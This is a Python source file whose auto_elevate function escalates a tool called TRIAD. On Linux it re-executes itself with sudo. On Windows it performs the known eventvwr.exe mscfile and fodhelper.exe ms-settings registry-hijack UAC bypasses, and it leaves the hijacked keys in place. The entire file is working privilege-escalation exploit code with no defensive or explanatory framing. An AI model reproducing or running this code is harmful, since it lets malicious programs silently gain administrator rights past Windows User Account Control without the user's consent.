import platform
import subprocess
import os
import sys
# registry only available on Windows
if os.name == 'nt':
    import winreg
else:
    winreg = None
import ctypes


def auto_elevate():
    """Attempt to elevate TRIAD to high integrity depending on OS."""
    release = platform.release()
    try:
        major = int(release.split(".")[0])
    except Exception:
        major = 0

    if os.name != 'nt':
        # on Linux simply re-exec with sudo/pkexec if not root
        if os.geteuid() != 0:
            try:
                subprocess.run(["sudo", sys.executable] + sys.argv)
                return True
            except Exception:
                return False
        return True

    if major < 10:
        # use MSC file registration trick
        key = r"Software\Classes\mscfile\shell\open\command"
        cmd = f"\"{sys.executable}\" \"{os.path.abspath(sys.argv[0])}\""
        try:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as k:
                winreg.SetValueEx(k, None, 0, winreg.REG_SZ, cmd)
            # launch eventvwr to trigger
            subprocess.Popen(["eventvwr.exe"])
            return True
        except Exception:
            return False
    else:
        # fodhelper bypass
        key = r"Software\Classes\ms-settings\Shell\Open\Command"
        cmd = f"\"{sys.executable}\" \"{os.path.abspath(sys.argv[0])}\""
        try:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as k:
                winreg.SetValueEx(k, None, 0, winreg.REG_SZ, cmd)
                winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen(["fodhelper.exe"])
            return True
        except Exception:
            return False
